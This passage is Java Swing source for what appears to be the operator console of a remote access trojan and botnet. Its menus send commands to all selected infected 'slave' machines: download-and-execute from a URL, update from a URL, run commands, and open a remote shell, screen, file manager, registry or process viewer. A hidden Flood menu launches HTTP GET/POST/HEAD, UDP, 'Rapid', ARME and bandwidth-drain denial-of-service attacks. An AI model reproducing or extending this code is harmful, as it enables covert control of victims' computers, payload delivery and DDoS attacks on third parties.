				int row = mainTable.getSelectedRow();
				int column = mainTable.getSelectedColumn();

				if (row != -1 && column == 0) {
					Slave sl = Utils.getSlave(mainModel.getValueAt(row, 3).toString());
					sl.setSelected(!sl.isSelected());
					ListSelectionModel selectionModel = mainTable.getSelectionModel();
					selectionModel.removeSelectionInterval(row, row);
					mainTable.repaint();
				}
			}
		});

		mainTable.setModel(new DefaultTableModel(new Object[][] {}, new String[] { "L", "Server ID", "Status", "IP/Port", "Ping", "User@Comp", "OS Name", "RAM", "Local IP", "Version" }) {
			public boolean isCellEditable(int i, int i1) {
				return false;
			}
		});
		mainTable.getColumnModel().getColumn(0).setPreferredWidth(60);
		mainTable.getColumnModel().getColumn(1).setPreferredWidth(97);
		mainTable.getColumnModel().getColumn(2).setPreferredWidth(89);
		mainTable.getColumnModel().getColumn(3).setPreferredWidth(124);
		mainTable.getColumnModel().getColumn(4).setPreferredWidth(60);
		mainTable.getColumnModel().getColumn(5).setPreferredWidth(125);
		mainTable.getColumnModel().getColumn(6).setPreferredWidth(98);
		mainTable.getColumnModel().getColumn(8).setPreferredWidth(105);
		mainTable.getColumnModel().getColumn(9).setPreferredWidth(51);

		mainModel = (DefaultTableModel) mainTable.getModel();

		mainTable.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);

		mainTable.getTableHeader().setReorderingAllowed(false);

		mainTable.setRowHeight(30);
		mainTable.setDefaultRenderer(Object.class, new MainTableRenderer());

		scrollPane.setViewportView(mainTable);
		addPopup(mainTable, popupMenu);

		JMenuItem mntmVisitUrl = new JMenuItem("Visit URL");
		mntmVisitUrl.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<Slave> servers = Utils.getSlaves();
				if (servers.size() > 0) {
					String result = Utils.showDialog("Visit URL", "Input URL to visit");
					if (result != null && !result.startsWith("http://")) {
						result = "http://" + result;
					}
					if (result == null) {
						return;
					}

					if (!result.startsWith("http://")) {
						JOptionPane.showMessageDialog(null, "Input valid URL!", "Visit URL", JOptionPane.ERROR_MESSAGE);
						return;
					}
					
					result = result.trim();

					for (Slave slave : servers) {
						slave.addToSendQueue(new Packet14VisitURL(result));
					}
				}

			}
		});
		mntmVisitUrl.setIcon(new ImageIcon(Frame.class.getResource("/icons/window_browser.png")));
		popupMenu.add(mntmVisitUrl);

		JMenu mnQuickOpen = new JMenu("Quick Open");
		mnQuickOpen.setIcon(new ImageIcon(Frame.class.getResource("/icons/window_import.png")));
		popupMenu.add(mnQuickOpen);

		JMenuItem mntmRemoteScreen = new JMenuItem("Remote Screen");
		mntmRemoteScreen.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
				if (slave != null) {
					FrameRemoteScreen.show(slave);
				}
			}
		});
		mntmRemoteScreen.setIcon(new ImageIcon(Frame.class.getResource("/icons/screen.png")));
		mnQuickOpen.add(mntmRemoteScreen);

		JMenuItem mntmFileManager = new JMenuItem("File Manager");
		mntmFileManager.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
				if (slave != null) {
					FrameRemoteFiles frame = new FrameRemoteFiles(slave);
					frame.setVisible(true);
				}
			}
		});
		
		JMenuItem mntmQuickRemoteScreen = new JMenuItem("Quick Remote Screen");
		mntmQuickRemoteScreen.setIcon(new ImageIcon(Frame.class.getResource("/icons/quick_remote_desktop.png")));
		mntmQuickRemoteScreen.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
				if (slave != null) {
					FrameQuickRemoteScreen frame = new FrameQuickRemoteScreen(slave);
					frame.setVisible(true);
				}			
			}
		});
		mnQuickOpen.add(mntmQuickRemoteScreen);
		
		JMenuItem mntmRemoteRegistry = new JMenuItem("Remote Registry");
		mntmRemoteRegistry.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
				if (slave != null) {
					FrameRemoteRegistry frame = new FrameRemoteRegistry(slave);
					frame.setVisible(true);
				}	
			}
		});
		mntmRemoteRegistry.setIcon(new ImageIcon(Frame.class.getResource("/icons/registry.png")));
		mnQuickOpen.add(mntmRemoteRegistry);
		mntmFileManager.setIcon(new ImageIcon(Frame.class.getResource("/icons/folder_go.png")));
		mnQuickOpen.add(mntmFileManager);

		JMenuItem mntmRemoteCmd = new JMenuItem("Remote CMD");
		mntmRemoteCmd.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
				if (slave != null) {
					FrameRemoteShell frame = new FrameRemoteShell(slave);
					frame.setVisible(true);
				}
			}
		});
		mntmRemoteCmd.setIcon(new ImageIcon(Frame.class.getResource("/icons/cmd.png")));
		mnQuickOpen.add(mntmRemoteCmd);

		JMenuItem mntmRemoteChat = new JMenuItem("Remote Chat");
		mntmRemoteChat.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
				if (slave != null) {
					FrameRemoteChat frame = new FrameRemoteChat(slave);
					frame.setVisible(true);
				}
			}
		});

		JMenuItem mntmRemoteProcess = new JMenuItem("Remote Process");
		mntmRemoteProcess.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
				if (slave != null) {
					FrameRemoteProcess frame = new FrameRemoteProcess(slave);
					frame.setVisible(true);
				}
			}
		});
		mntmRemoteProcess.setIcon(new ImageIcon(Frame.class.getResource("/icons/process.png")));
		mnQuickOpen.add(mntmRemoteProcess);
		mntmRemoteChat.setIcon(new ImageIcon(Frame.class.getResource("/icons/chat.png")));
		mnQuickOpen.add(mntmRemoteChat);

		JMenuItem mntmNotes = new JMenuItem("Notes");
		mntmNotes.setIcon(new ImageIcon(Frame.class.getResource("/icons/sticky-notes-pin.png")));
		mntmNotes.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
				if (slave != null) {
					FrameNotes frame = new FrameNotes(slave);
					frame.setVisible(true);
				}
			}
		});
		mnQuickOpen.add(mntmNotes);
		popupMenu.addSeparator();

		JMenuItem mntmRunCommand = new JMenuItem("Run Command");
		mntmRunCommand.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<Slave> servers = Utils.getSlaves();
				if (servers.size() > 0) {
					String process = Utils.showDialog("Run Command", "Select command to send to servers");
					if (process == null) {
						return;
					}

					for (Slave slave : servers) {
						slave.addToSendQueue(new Packet38RunCommand(process));
					}
				}
			}
		});
		mntmRunCommand.setIcon(new ImageIcon(Frame.class.getResource("/icons/runcmd.png")));
		popupMenu.add(mntmRunCommand);

		JMenuItem mntmUpdateFromUrl = new JMenuItem("Update from URL");
		mntmUpdateFromUrl.setIcon(new ImageIcon(Frame.class.getResource("/icons/update.png")));
		mntmUpdateFromUrl.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<Slave> servers = Utils.getSlaves();
				if (servers.size() > 0) {
					String result = Utils.showDialog("Update from URL", "Input URL to update with");
					if (result == null) {
						return;
					}
					try {
						URLParser.parse(result);
					} catch (Exception ex) {
						JOptionPane.showMessageDialog(null, "Input valid URL!", "Update from URL", JOptionPane.ERROR_MESSAGE);
						return;
					}	
					
					result = result.trim().replace(" ", "%20");
					
					for (Slave sl : servers) {
						sl.addToSendQueue(new Packet18Update(result));
					}
				}
			}
		});

		JMenuItem mntmexe = new JMenuItem("Download and Execute");
		popupMenu.add(mntmexe);
		mntmexe.setIcon(new ImageIcon(Frame.class.getResource("/icons/down_arrow.png")));
		mntmexe.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<Slave> servers = Utils.getSlaves();
				if (servers.size() > 0) {
					String result = Utils.showDialog("Download and Execute", "Input URL to download and execute");
					if (result == null) {
						return;
					}
					
					try {
						URLParser.parse(result);
					} catch (Exception ex) {
						JOptionPane.showMessageDialog(null, "Input valid URL!", "Download URL", JOptionPane.ERROR_MESSAGE);
						return;
					}			

					result = result.trim().replace(" ", "%20");
					
					String filetype = FrameFileType.showDialog();
					
					if (filetype == null) {
						return;
					}
					
					for (Slave slave : servers) {
						slave.addToSendQueue(new Packet17DownloadExecute(result, filetype));
					}
				}
			}
		});
		popupMenu.add(mntmUpdateFromUrl);

		JMenu mnFlood = new JMenu("Flood");
		mnFlood.setVisible(false);
		mnFlood.setIcon(new ImageIcon(Frame.class.getResource("/icons/flood.png")));
		popupMenu.add(mnFlood);

		JMenuItem mntmHttpFlood = new JMenuItem("HTTP GET flood");
		mntmHttpFlood.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String target = Utils.showDialog("HTTP GET flood", "Enter URL to flood");
				if (target == null) {
					return;
				}
				String time = Utils.showDialog("HTTP GET flood", "Enter seconds to flood");
				if (time == null) {
					return;
				}
				int time1;
				try {
					time1 = Integer.parseInt(time);
				} catch (Exception ex) {
					return;
				}
				List<Slave> servers = Utils.getSlaves();
				if (servers.size() > 0) {
					for (Slave sl : servers) {
						sl.addToSendQueue(new Packet22Flood(Flood.GET, target, time1));
					}
				}
			}
		});
		mntmHttpFlood.setIcon(new ImageIcon(Frame.class.getResource("/icons/http_flood.png")));
		mnFlood.add(mntmHttpFlood);

		JMenuItem mntmUdpFlood = new JMenuItem("UDP flood");
		mntmUdpFlood.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String target = Utils.showDialog("UDP flood", "Enter IP:Port to flood");
				if (target == null) {
					return;
				}
				try {
					String[] targetargs = target.split(":");
					Integer.parseInt(targetargs[1]);
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				String time = Utils.showDialog("UDP flood", "Enter seconds to flood");
				if (time == null) {
					return;
				}
				int time1;
				try {
					time1 = Integer.parseInt(time);
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				List<Slave> servers = Utils.getSlaves();
				if (servers.size() > 0) {
					for (Slave sl : servers) {
						sl.addToSendQueue(new Packet22Flood(Flood.UDP, target, time1));
					}
				}
			}
		});

		JMenuItem mntmHttpPostFlood = new JMenuItem("HTTP Post flood");
		mntmHttpPostFlood.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String target = Utils.showDialog("HTTP Post flood", "Enter URL to flood");
				if (target == null) {
					return;
				}
				String time = Utils.showDialog("HTTP Post flood", "Enter seconds to flood");
				if (time == null) {
					return;
				}
				int time1;
				try {
					time1 = Integer.parseInt(time);
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				List<Slave> servers = Utils.getSlaves();
				if (servers.size() > 0) {
					for (Slave sl : servers) {
						sl.addToSendQueue(new Packet22Flood(Flood.POST, target, time1));
					}
				}
			}
		});
		mntmHttpPostFlood.setIcon(new ImageIcon(Frame.class.getResource("/icons/http_flood.png")));
		mnFlood.add(mntmHttpPostFlood);

		JMenuItem mntmHttpHeadFlood = new JMenuItem("HTTP Head flood");
		mntmHttpHeadFlood.setIcon(new ImageIcon(Frame.class.getResource("/icons/http_flood.png")));
		mntmHttpHeadFlood.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String target = Utils.showDialog("HTTP Head flood", "Enter URL to flood");
				if (target == null) {
					return;
				}
				String time = Utils.showDialog("HTTP Head flood", "Enter seconds to flood");
				if (time == null) {
					return;
				}
				int time1;
				try {
					time1 = Integer.parseInt(time);
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				List<Slave> servers = Utils.getSlaves();
				if (servers.size() > 0) {
					for (Slave sl : servers) {
						sl.addToSendQueue(new Packet22Flood(Flood.HEAD, target, time1));
					}
				}
			}
		});
		mnFlood.add(mntmHttpHeadFlood);
		mntmUdpFlood.setIcon(new ImageIcon(Frame.class.getResource("/icons/udp_flood.png")));
		mnFlood.add(mntmUdpFlood);

		JMenuItem mntmSsynFlood = new JMenuItem("Rapid flood");
		mntmSsynFlood.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String target = Utils.showDialog("SSYN flood", "Enter website URL to flood");
				if (target == null) {
					return;
				}

				String time = Utils.showDialog("SSYN flood", "Enter seconds to flood");
				if (time == null) {
					return;
				}
				int time1;
				try {
					time1 = Integer.parseInt(time);
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				List<Slave> servers = Utils.getSlaves();
				if (servers.size() > 0) {
					for (Slave sl : servers) {
						sl.addToSendQueue(new Packet22Flood(Flood.RAPID, target, time1));
					}
				}
			}
		});
		mntmSsynFlood.setIcon(new ImageIcon(Frame.class.getResource("/icons/rapid_flood.png")));
		mnFlood.add(mntmSsynFlood);

		JMenuItem mntmBandwidthDrain = new JMenuItem("Bandwidth drain");
		mntmBandwidthDrain.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String target = Utils.showDialog("Bandwidth drain", "Enter URL to mass download");
				if (target == null) {
					return;
				}
				String time = Utils.showDialog("Bandwidth drain", "Enter seconds to drain");
				if (time == null) {
					return;
				}
				int time1;
				try {
					time1 = Integer.parseInt(time);
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				List<Slave> servers = Utils.getSlaves();
				if (servers.size() > 0) {
					for (Slave sl : servers) {
						sl.addToSendQueue(new Packet22Flood(Flood.DRAIN, target, time1));
					}
				}
			}
		});
		mntmBandwidthDrain.setIcon(new ImageIcon(Frame.class.getResource("/icons/antivirus.png")));
		mnFlood.add(mntmBandwidthDrain);

		JMenuItem mntmArme = new JMenuItem("ARME");
		mntmArme.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String target = Utils.showDialog("ARME flood", "Enter Host:Port/IP:Port to flood");
				if (target == null) {
					return;
				}
				try {
					String[] targetargs = target.split(":");
					Integer.parseInt(targetargs[1]);
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				String time = Utils.showDialog("ARME flood", "Enter seconds to flood");
				if (time == null) {
					return;
				}
				int time1;
				try {
					time1 = Integer.parseInt(time);
				} catch (Exception ex) {
					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				List<Slave> servers = Utils.getSlaves();
				if (servers.size() > 0) {
					for (Slave sl : servers) {
						sl.addToSendQueue(new Packet22Flood(Flood.ARME, target, time1));
					}
				}
			}
		});
		mntmArme.setIcon(new ImageIcon(Frame.class.getResource("/icons/arme_flood.png")));
		mnFlood.add(mntmArme);
		popupMenu.addSeparator();

		JMenuItem mntmInfo = new JMenuItem("Info");
		mntmInfo.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
				if (slave != null) {
					FrameInfo screen = new FrameInfo(slave);
					screen.setVisible(true);
				}
			}
		});

		JMenuItem mntmHost = new JMenuItem("Host");
		mntmHost.setIcon(new ImageIcon(Frame.class.getResource("/icons/computer_info.png")));
		mntmHost.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
				if (slave != null) {
					JOptionPane.showMessageDialog(null, slave.getHost(), "Host - " + slave.getIP(), JOptionPane.INFORMATION_MESSAGE);
				}
			}
		});
		popupMenu.add(mntmHost);
		mntmInfo.setIcon(new ImageIcon(Frame.class.getResource("/icons/info.png")));
		popupMenu.add(mntmInfo);

		JMenuItem mntmForceDisconnect = new JMenuItem("Disconnect");
		mntmForceDisconnect.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<Slave> servers = Utils.getSlaves();
				if (servers.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm disconnecting " + servers.size() + " servers")) {
						for (Slave sl : servers) {
							try {
								sl.addToSendQueue(new Packet11Disconnect());
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});

		JMenuItem mntmRestart = new JMenuItem("Restart");
		mntmRestart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<Slave> servers = Utils.getSlaves();
				if (servers.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm restarting " + servers.size() + " servers")) {
						for (Slave sl : servers) {
							try {
								sl.addToSendQueue(new Packet37RestartJavaProcess());
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});

		JMenuItem mntmRename = new JMenuItem("Rename");
		mntmRename.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
				if (slave != null) {
					FrameRename screen = new FrameRename(slave);
					screen.setVisible(true);
				}
			}
		});
		mntmRename.setIcon(new ImageIcon(Frame.class.getResource("/icons/rename.png")));
		popupMenu.add(mntmRename);
		popupMenu.addSeparator();
		mntmRestart.setIcon(new ImageIcon(Frame.class.getResource("/icons/refresh.png")));
		popupMenu.add(mntmRestart);

		JMenuItem mntmRestartConnection = new JMenuItem("Reconnect");
		mntmRestartConnection.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<Slave> servers = Utils.getSlaves();
				if (servers.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm reconnect " + servers.size() + " servers")) {
						for (Slave sl : servers) {
							try {
								sl.addToSendQueue(new Packet45Reconnect());
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});
		mntmRestartConnection.setIcon(new ImageIcon(Frame.class.getResource("/icons/refresh_blue.png")));
		popupMenu.add(mntmRestartConnection);
		mntmForceDisconnect.setIcon(new ImageIcon(Frame.class.getResource("/icons/delete.png")));
		popupMenu.add(mntmForceDisconnect);

		JMenuItem mntmUninstall = new JMenuItem("Uninstall");
		mntmUninstall.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<Slave> servers = Utils.getSlaves();
				if (servers.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm uninstalling " + servers.size() + " servers")) {
						for (Slave sl : servers) {
							try {
								sl.addToSendQueue(new Packet36Uninstall());
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});

		mntmUninstall.setIcon(new ImageIcon(Frame.class.getResource("/icons/exit.png")));
		popupMenu.add(mntmUninstall);

		JPanel panel = new JPanel();
		GroupLayout gl_panel = new GroupLayout(panel);
		gl_panel.setHorizontalGroup(gl_panel.createParallelGroup(Alignment.LEADING).addGap(0, 602, Short.MAX_VALUE));
		gl_panel.setVerticalGroup(gl_panel.createParallelGroup(Alignment.LEADING).addGap(0, 293, Short.MAX_VALUE));
		panel.setLayout(gl_panel);
		
		tabbedPane.addTab("Statistics", IconUtils.getIcon("statistics", true), panelStats, null);

		JPanel panel_onconnect = new JPanel();
		tabbedPane.addTab("On Connect", IconUtils.getIcon("onconnect", true), panel_onconnect, null);

		JScrollPane scrollPane_1 = new JScrollPane();
		scrollPane_1.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
		scrollPane_1.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		final JComboBox<Object> boxOnConnect = new JComboBox<Object>();
		boxOnConnect.setModel(new DefaultComboBoxModel<Object>(Events.events.toArray()));

		JButton btnAdd = new JButton("Add");
		btnAdd.setToolTipText("Add");
		btnAdd.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Events.add(boxOnConnect.getSelectedItem().toString());
			}
		});

		btnAdd.setIcon(new ImageIcon(Frame.class.getResource("/icons/calendar_add.png")));

		final JButton btnDelete = new JButton("Delete");
		btnDelete.setToolTipText("Delete selected event");
		btnDelete.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String name = onConnectModel.getValueAt(onConnectTable.getSelectedRow(), 1).toString();
				if (name != null) {
					Events.remove(name);
					onConnectModel.removeRow(onConnectTable.getSelectedRow());
				}
			}
		});
		btnDelete.setIcon(new ImageIcon(Frame.class.getResource("/icons/calendar_remove.png")));

		JButton btnPerform = new JButton("Perform");
		btnPerform.setToolTipText("Perform selected event on all servers");
		btnPerform.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String name = onConnectModel.getValueAt(onConnectTable.getSelectedRow(), 1).toString();
				if (name != null) {
					Event event = Events.getByName(name);
					if (event != null) {
						for (Slave sl : Main.connections) {
							event.perform(sl);
						}
					}
				}
			}
		});
		btnPerform.setIcon(new ImageIcon(Frame.class.getResource("/icons/calendar_perform.png")));

		JButton btnEdit = new JButton("Edit");
		btnEdit.setToolTipText("Edit selected event");
		btnEdit.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String name = onConnectModel.getValueAt(onConnectTable.getSelectedRow(), 1).toString();
				if (name != null) {
					Event event = Events.getByName(name);
					if (event != null) {
						if (event.add()) {
							onConnectModel.removeRow(onConnectTable.getSelectedRow());
							onConnectModel.addRow(event.getDisplayData());
						}
					}
				}
			}
		});
		btnEdit.setIcon(new ImageIcon(Frame.class.getResource("/icons/calendar_edit.png")));

		GroupLayout gl_panel_onconnect = new GroupLayout(panel_onconnect);
		gl_panel_onconnect.setHorizontalGroup(gl_panel_onconnect.createParallelGroup(Alignment.TRAILING).addGroup(gl_panel_onconnect.createSequentialGroup().addContainerGap(56, Short.MAX_VALUE).addComponent(btnEdit).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnPerform).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnDelete).addPreferredGap(ComponentPlacement.RELATED).addComponent(boxOnConnect, GroupLayout.PREFERRED_SIZE, 158, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnAdd, GroupLayout.PREFERRED_SIZE, 91, GroupLayout.PREFERRED_SIZE).addContainerGap()).addComponent(scrollPane_1, GroupLayout.DEFAULT_SIZE, 602, Short.MAX_VALUE));
		gl_panel_onconnect.setVerticalGroup(gl_panel_onconnect.createParallelGroup(Alignment.TRAILING).addGroup(gl_panel_onconnect.createSequentialGroup().addComponent(scrollPane_1, GroupLayout.DEFAULT_SIZE, 251, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_panel_onconnect.createParallelGroup(Alignment.BASELINE).addComponent(btnAdd).addComponent(boxOnConnect, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(btnDelete).addComponent(btnPerform, GroupLayout.PREFERRED_SIZE, 25, GroupLayout.PREFERRED_SIZE).addComponent(btnEdit)).addContainerGap()));

		onConnectTable = new JTable() {
			@SuppressWarnings({ "unchecked", "rawtypes" })
			@Override
			public Class getColumnClass(int column) {
				if (column == 0) {
					return ImageIcon.class;
				}
				return super.getColumnClass(column);
			}
		};
		onConnectTable.setModel(onConnectModel = new DefaultTableModel(new Object[][] {}, new String[] { " ", "Name", "Type", "", "" }) {
			public boolean isCellEditable(int i, int i1) {
				return false;
			}
		});

		onConnectTable.getTableHeader().setReorderingAllowed(false);
		onConnectTable.getColumnModel().getColumn(0).setPreferredWidth(27);
		onConnectTable.getColumnModel().getColumn(1).setPreferredWidth(133);
		onConnectTable.getColumnModel().getColumn(2).setPreferredWidth(129);
		onConnectTable.getColumnModel().getColumn(3).setPreferredWidth(140);
		onConnectTable.getColumnModel().getColumn(4).setPreferredWidth(175);
		onConnectTable.setRowHeight(20);
		scrollPane_1.setViewportView(onConnectTable);
		panel_onconnect.setLayout(gl_panel_onconnect);

		for (Plugin plugin : PluginLoader.plugins) {
			if (plugin.getItems() != null && plugin.getItems().size() > 0) {
				popupMenu.addSeparator();
				break;
			}
		}
		for (Plugin plugin : PluginLoader.plugins) {
			if (plugin.getItems() != null && plugin.getItems().size() > 0) {
				for (final RATMenuItem en : plugin.getItems()) {
					JMenuItem item = en.getItem();
					
					item.addActionListener(new ActionListener() {
						public void actionPerformed(ActionEvent e) {
							List<Slave> list = Utils.getSlaves();
							List<RATObject> servers = new ArrayList<RATObject>();
							for (int i = 0; i < list.size(); i++) {
								servers.add(RATObjectFormat.format(list.get(i)));
							}

							en.getListener().onClick(servers);
						}
					});
					popupMenu.add(item);
				}
			}
		}

		tabbedPane.addTab("Sockets", IconUtils.getIcon("sockets"), new PanelMainSockets(), null);
		tabbedPane.addTab("Log", IconUtils.getIcon("log"), PanelMainLog.instance, null);
		tabbedPane.addTab("Plugins", IconUtils.getIcon("plugin"), PanelMainPlugins.instance, null);

		toolBar = new JToolBar();
		toolBar.setVisible(false);

		for (int i = 0; i < popupMenu.getComponents().length; i++) {
			Component component = popupMenu.getComponents()[i];

			if (component instanceof JMenuItem && !(component instanceof JMenu)) {
				JMenuItem item = (JMenuItem) component;

				JButton button = new JButton();
				button.setIcon(item.getIcon());
				button.setToolTipText(item.getText());

				for (int i1 = 0; i1 < item.getActionListeners().length; i1++) {
					button.addActionListener(item.getActionListeners()[i1]);
				}

				toolBar.add(button);
			} else if (component instanceof JSeparator) {
				toolBar.addSeparator();
			}
		}

		toolBar.setFloatable(false);
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addComponent(toolBar, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE).addComponent(tabbedPane, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 631, Short.MAX_VALUE)).addGap(0)));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(toolBar, GroupLayout.PREFERRED_SIZE, 20, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(tabbedPane, GroupLayout.DEFAULT_SIZE, 325, Short.MAX_VALUE).addGap(0)));
		contentPane.setLayout(gl_contentPane);
				
		reloadPlugins();
	}

	private static void addPopup(Component component, final JPopupMenu popup) {
		component.addMouseListener(new MouseAdapter() {
			public void mousePressed(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}

			public void mouseReleased(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}

			private void showMenu(MouseEvent e) {
				popup.show(e.getComponent(), e.getX(), e.getY());
			}
		});
	}
	
	public void reloadPlugins() {
		mnPlugins.removeAll();
		if (PluginLoader.plugins.size() == 0) {
			JMenuItem item = new JMenuItem("No plugins loaded");
			item.setEnabled(false);
			mnPlugins.add(item);
		}
		
		for (int i = 0; i < PluginLoader.plugins.size(); i++) {
			final Plugin p = PluginLoader.plugins.get(i);
			
			JMenuItem item = new JMenuItem(p.getName());
			
			ActionListener listener = p.getGlobalItemListener();
			
			item.setEnabled(listener != null);
			
			if (listener != null) {
				item.addActionListener(listener);
			} else {
				item.addActionListener(new ActionListener() {
					@Override
					public void actionPerformed(ActionEvent e) {
						JOptionPane.showMessageDialog(null, "Name: " + p.getName() + "\nVersion: " + p.getVersion() + "\nAuthor: " + p.getAuthor() + "\nDescription: " + p.getDescription());
					}			
				});
			}
			
			File iconFile = new File("plugins/" + p.getName().replace(" ", "") + "/icon.png");
			
			if (iconFile.exists()) {
				item.setIcon(new ImageIcon(iconFile.getAbsolutePath()));
			} else {
				item.setIcon(PluginsTableRenderer.PLUGIN_ICON);
			}
			
			mnPlugins.add(item);
		}

		PanelMainPlugins.instance.reload();
	}

	public void unselectAll() {
		for (int i = 0; i < Main.connections.size(); i++) {
			Main.connections.get(i).setSelected(false);
		}
		mainTable.repaint();
	}

	public void selectAll() {
		for (int i = 0; i < Main.connections.size(); i++) {
			Main.connections.get(i).setSelected(true);
		}
		mainTable.repaint();
	}
}